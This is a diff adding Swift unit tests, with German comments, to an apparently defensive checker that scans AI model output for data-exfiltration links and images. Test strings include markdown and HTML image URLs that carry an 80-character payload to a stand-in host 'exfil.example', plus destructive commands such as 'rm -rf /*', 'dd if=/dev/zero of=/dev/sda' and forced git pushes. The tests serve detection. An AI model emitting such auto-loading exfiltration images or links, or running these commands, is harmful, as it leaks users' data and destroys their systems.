@@ -103,3 +103,68 @@ final class ExfiltrationCheckTests: XCTestCase {
         XCTAssertLessThanOrEqual(finding?.evidence?.count ?? 999, 49)
     }
 }
+
+/// Der Ausgang wird zum Transportmittel — auch ohne Markdown-Rahmen.
+///
+/// `bareURLPattern` war deklariert und wurde nie benutzt: eine nackte
+/// Abfluss-URL lief ungeprueft durch, obwohl genau sie der einfachste Kanal
+/// ist. HTML-Bilder fehlten ganz, dabei laden sie beim Rendern von selbst —
+/// viele Oberflaechen zeigen Modell-Ausgaben als HTML an.
+final class ExfiltrationChannelTests: XCTestCase {
+
+    private let check = ExfiltrationCheck()
+    private let payload = String(repeating: "A", count: 80)
+
+    private func rules(_ text: String, _ other: ExfiltrationCheck? = nil) -> [String] {
+        (other ?? check).inspect(OutputContext(output: text)).map(\.rule.rawValue)
+    }
+
+    func testBareURLWithPayloadIsFound() {
+        XCTAssertTrue(rules("Details: https://exfil.example/s?d=\(payload)")
+            .contains(RuleCatalog.exfiltrationLink.rawValue))
+    }
+
+    /// Laedt beim Rendern automatisch — zaehlt wie das Markdown-Bild.
+    func testHTMLImageIsTreatedAsAnImage() {
+        XCTAssertTrue(rules("<img src=\"https://exfil.example/p?d=\(payload)\">")
+            .contains(RuleCatalog.exfiltrationImage.rawValue))
+        XCTAssertTrue(rules("<IMG WIDTH=1 SRC='https://exfil.example/p?d=\(payload)'>")
+            .contains(RuleCatalog.exfiltrationImage.rawValue))
+    }
+
+    /// Dieselbe Adresse steckt in mehreren Mustern. Ohne Zusammenfassung
+    /// meldete sie bis zu drei Befunde und triebe den Risikowert kuenstlich hoch.
+    func testEachTargetIsReportedOnce() {
+        XCTAssertEqual(rules("![x](https://exfil.example/p?d=\(payload))"),
+                       [RuleCatalog.exfiltrationImage.rawValue])
+        XCTAssertEqual(rules("[hier](https://exfil.example/p?d=\(payload))"),
+                       [RuleCatalog.exfiltrationLink.rawValue])
+    }
+
+    func testHarmlessURLsStayHarmless() {
+        XCTAssertTrue(rules("Siehe https://example.com/doku").isEmpty)
+        XCTAssertTrue(rules("![logo](https://example.com/logo.png)").isEmpty)
+    }
+
+    func testAllowedHostsCoverTheNewChannels() {
+        let allowing = ExfiltrationCheck(allowedHosts: ["wiki.example.com"])
+        XCTAssertTrue(rules("<img src=\"https://wiki.example.com/p?d=\(payload)\">", allowing).isEmpty)
+        XCTAssertTrue(rules("https://wiki.example.com/p?d=\(payload)", allowing).isEmpty)
+    }
+
+    /// Die haeufigeren Schreibweisen liefen vorher durch: `rm -rf /*` scheiterte
+    /// an der Leerzeichen-Forderung hinter dem Schraegstrich, `git push -f` war
+    /// gar nicht abgedeckt.
+    func testCommonDestructiveSpellingsAreCaught() {
+        for command in ["Fuehre rm -rf /* aus", "git push -f origin main",
+                        "dd if=/dev/zero of=/dev/sda", "rm -rf / ", "git push --force"] {
+            XCTAssertTrue(rules(command).contains(RuleCatalog.destructiveCommand.rawValue),
+                          "nicht erkannt: \(command)")
+        }
+    }
+
+    func testOrdinaryCommandsAreNotFlagged() {
+        XCTAssertTrue(rules("git push origin main").isEmpty)
+        XCTAssertTrue(rules("rm -rf ./build").isEmpty)
+    }
+}
